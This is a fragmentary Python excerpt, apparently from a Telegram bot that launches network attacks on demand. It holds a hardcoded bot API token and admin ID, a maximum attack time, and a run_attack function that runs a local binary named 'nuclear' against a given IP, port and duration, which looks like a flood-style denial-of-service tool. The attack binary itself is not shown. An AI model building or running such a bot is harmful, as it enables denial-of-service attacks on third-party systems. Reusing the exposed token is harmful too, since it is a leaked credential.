...
API_TOKEN = "7515674729:AAFDWoXybsuPBI1F6_O8WsY_cvVi2DhLTZk
"
ADMIN_ID = 6342200507  # change this to your Telegram ID
...
MAX_TIME = 600  # Default max time in seconds
...
async def run_attack(ip, port, duration, threads, msg):
    try:
        subprocess.Popen(["./nuclear", ip, port, str(duration), str(1700)])
